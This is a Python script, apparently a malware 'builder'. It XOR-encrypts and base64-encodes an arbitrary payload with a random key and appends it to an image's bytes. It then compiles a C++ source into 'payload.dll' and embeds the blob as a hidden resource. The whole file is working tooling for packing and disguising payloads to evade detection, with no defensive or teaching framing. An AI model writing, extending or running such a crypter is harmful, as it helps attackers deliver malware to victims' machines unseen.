import os
import sys
import re
import base64
import glob
import subprocess
import ctypes
from ctypes import wintypes

def obfuscate(payload: bytes, key: str) -> str:
    encrypted = bytearray(b ^ ord(key[i % len(key)]) for i, b in enumerate(payload))
    return base64.b64encode(encrypted).decode()

def inject_image_size(source_cpp: str, size: int) -> str:
    with open(source_cpp, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()
    
    define = f"#define ORIGIN_IMAGE_FILE {size}"
    content = re.sub(r"#define\s+ORIGIN_IMAGE_FILE\s+\d+", define, content) if re.search(r"#define\s+ORIGIN_IMAGE_FILE\s+\d+", content) else define + "\n" + content

    temp = os.path.join("output", "temp_source.cpp")
    os.makedirs("output", exist_ok=True)
    with open(temp, "w", encoding="utf-8") as f:
        f.write(content)
    return temp

def add_resource(dll_path: str, data: bytes, res_id: int = 101):
    k32 = ctypes.WinDLL("kernel32", use_last_error=True)
    
    # 1. Khai báo kiểu dữ liệu chuẩn cho các hàm API
    BeginUpdateResourceW = k32.BeginUpdateResourceW
    BeginUpdateResourceW.argtypes = [wintypes.LPCWSTR, wintypes.BOOL]
    BeginUpdateResourceW.restype = wintypes.HANDLE

    UpdateResourceW = k32.UpdateResourceW
    UpdateResourceW.argtypes = [wintypes.HANDLE, wintypes.LPCWSTR, wintypes.LPCWSTR,
                                wintypes.WORD, wintypes.LPVOID, wintypes.DWORD]
    UpdateResourceW.restype = wintypes.BOOL

    EndUpdateResourceW = k32.EndUpdateResourceW
    EndUpdateResourceW.argtypes = [wintypes.HANDLE, wintypes.BOOL]
    EndUpdateResourceW.restype = wintypes.BOOL

    MAKEINTRESOURCE = lambda i: ctypes.cast(i, wintypes.LPCWSTR)
    
    # 2. Thực thi ghi Resource
    h = BeginUpdateResourceW(dll_path, False)
    if not h or h == wintypes.HANDLE(-1).value:
        raise ctypes.WinError(ctypes.get_last_error())

    buf = ctypes.create_string_buffer(data)
    
    # RT_RCDATA = 10
    ok = UpdateResourceW(h, MAKEINTRESOURCE(10), MAKEINTRESOURCE(res_id), 0, buf, len(data))
    if not ok:
        EndUpdateResourceW(h, True) # Discard thay đổi nếu lỗi
        raise ctypes.WinError(ctypes.get_last_error())

    if not EndUpdateResourceW(h, False): # Ghi thay đổi
        raise ctypes.WinError(ctypes.get_last_error())

def main():
    if len(sys.argv) < 3:
        print("Usage: python builder.py <payload> <image> [source.cpp]")
        return

    payload_file, image_file = sys.argv[1], sys.argv[2]
    source_cpp = sys.argv[3] if len(sys.argv) > 3 else glob.glob("*.cpp")[0]

    with open(payload_file, "rb") as f: payload = f.read()
    with open(image_file, "rb") as f: image_data = f.read()

    key = os.urandom(16).hex()
    obfuscated = obfuscate(payload, key)
    full_resource_data = image_data + key.encode() + obfuscated.encode()

    img_size = len(image_data)
    temp_src = inject_image_size(source_cpp, img_size)

    output_dll = os.path.join("output", "payload.dll")
    sources = [temp_src] + (["base64.cpp"] if os.path.isfile("base64.cpp") else [])

    # Biên dịch DLL
    cmd = ["cl", "/nologo", "/LD", "/EHsc", f"/Fe:{output_dll}"] + sources + ["user32.lib", "/link", "/DLL"]
    res = subprocess.run(cmd, capture_output=True, text=True)
    
    if res.returncode != 0:
        print("[-] Compile error:\n", res.stdout, res.stderr)
        return

    # Nhúng Data vào Resource
    try:
        add_resource(output_dll, full_resource_data, res_id=101)
        print(f"[+] Success -> {output_dll}")
        print(f"[+] Key: {key} | Image Size: {img_size} | Payload Size: {len(payload)}")
    except Exception as e:
        print(f"[-] Resource inject failed: {e}")

    if os.path.exists(temp_src): os.remove(temp_src)

if __name__ == "__main__":
    main()